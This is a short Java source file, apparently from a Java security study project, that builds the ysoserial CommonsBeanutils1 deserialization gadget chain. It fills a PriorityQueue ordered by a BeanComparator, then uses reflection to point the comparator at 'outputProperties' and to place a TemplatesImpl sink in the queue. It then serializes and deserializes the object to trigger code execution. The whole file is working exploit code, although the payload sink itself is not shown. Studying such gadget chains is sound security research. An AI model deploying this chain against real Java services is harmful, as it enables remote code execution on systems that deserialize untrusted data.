package com.pacemrc.javasec.deserialize.ysoserial;

import com.pacemrc.javasec.tools.ysoserial.Reflections;
import com.pacemrc.javasec.utils.Deserialize;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.math.BigInteger;
import java.util.PriorityQueue;

public class CB1 {

    public static void main(String[] args) throws Exception {

        TemplatesImpl templates = Sinks.getTemplatesImplSink();
        BeanComparator comparator = new BeanComparator("lowestSetBit");

        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        Reflections.setFieldValue(comparator, "property", "outputProperties");

        Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = templates;

        Deserialize.doSerialAndDeserial(queue);
    }
}
